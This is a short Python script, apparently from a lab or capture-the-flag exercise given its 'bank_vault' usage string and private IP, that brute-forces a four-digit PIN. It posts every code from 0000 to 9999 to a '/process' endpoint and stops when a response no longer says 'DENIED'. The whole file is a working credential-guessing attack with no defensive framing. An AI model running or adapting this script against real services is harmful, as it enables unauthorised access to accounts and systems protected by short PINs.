import requests
import sys

#url = "http://192.168.0.116"
#port = "5000"

try:
    url = sys.argv[1]
    port = sys.argv[2]
    protocol = "http://"
except IndexError:
    raise SystemExit(f"Usage: {sys.argv[0]} <bank_vault_IP> <PORT>")

for i in range(0,10000):
    pin = str(i).zfill(4)
    print(f"Trying with pin: {pin}")

    payload = {"pincode": pin}
    response = requests.post(f"{protocol}{url}:{port}/process", data = payload)

    if "DENIED"  in response.text:
        print(f"PIN {pin} DENIED")

    else:
        print(f"""################### ACCESS WITH PIN: {pin} ####################""")
        break
